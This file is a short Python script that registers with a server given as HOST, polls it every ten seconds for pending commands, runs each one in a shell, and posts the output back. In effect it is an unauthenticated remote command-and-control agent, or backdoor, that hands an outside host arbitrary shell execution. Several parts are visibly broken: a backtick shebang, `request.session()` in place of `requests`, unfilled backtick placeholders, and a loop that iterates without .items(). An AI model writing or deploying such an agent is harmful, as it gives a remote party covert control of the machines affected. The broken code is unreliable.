#!`which python`


import requests
import time
import json
import subprocess
import sys

session=request.session()


CLIENTNAME="`clientname`"
UNAME="`uname -a`"
HOST="`echo $HOST`"
CLIENTID=json.loads(session.post('http://' + HOST + '/client/register_client',data={
    'clientname':CLIENTNAME,
    'uname':UNAME,
}).text)['clientid']

def do_cmd(cmd):
    return subprocess.check_output(cmd,shell=True).decode().strip()


while True:
    control=json.loads(session.post('http://'+HOST+'/client/get_pending', data={
        'clientname':CLIENTNAME,
        'uname':UNAME,
        'clientid':CLIENTID,
    }).text)

    response={
        commandid: do_cmd(command)
        for commandid, command in control
    }

    if len(response) > 0:
        session.post('http://'+HOST+'/client/submit_pending', data=response)
    
    time.sleep(10)
    

